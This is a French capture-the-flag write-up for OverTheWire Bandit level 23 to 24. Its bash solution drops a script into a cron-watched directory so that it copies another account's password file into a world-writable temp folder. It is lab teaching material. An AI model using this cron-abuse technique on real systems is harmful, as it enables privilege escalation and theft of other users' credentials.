# Bandit Level 23 → 24 — Écrire un script pour cron

> OverTheWire Bandit · Write-up pédagogique (KRX_404)  
> Site officiel : [Level 23](https://overthewire.org/wargames/bandit/bandit23.html)

## Objectif
Déposer un script dans le dossier surveillé pour copier le password bandit24.

## Commandes utiles
`vim`, `chmod`, `cron`

## Solution guidée
```bash
mkdir -p /tmp/mybandit23_$USER
chmod 777 /tmp/mybandit23_$USER
cat > /tmp/mybandit23_$USER/script.sh <<'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mybandit23_$USER/pass.txt
EOF
chmod +x /tmp/mybandit23_$USER/script.sh
cp /tmp/mybandit23_$USER/script.sh /var/spool/bandit24/$USER/script.sh
# attendre le cron (~1 min)
cat /tmp/mybandit23_$USER/pass.txt
```
Adapte les chemins exacts selon `cat /etc/cron.d/bandit24` + le script associé.


## Ce que tu apprends
Scripts, permissions, automation cron.

## Note importante
Les **mots de passe Bandit changent** quand OverTheWire reset le lab.  
N’copie pas un password trouvé sur Internet : **relance les commandes** pour obtenir le tien.

## Connexion type
```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```
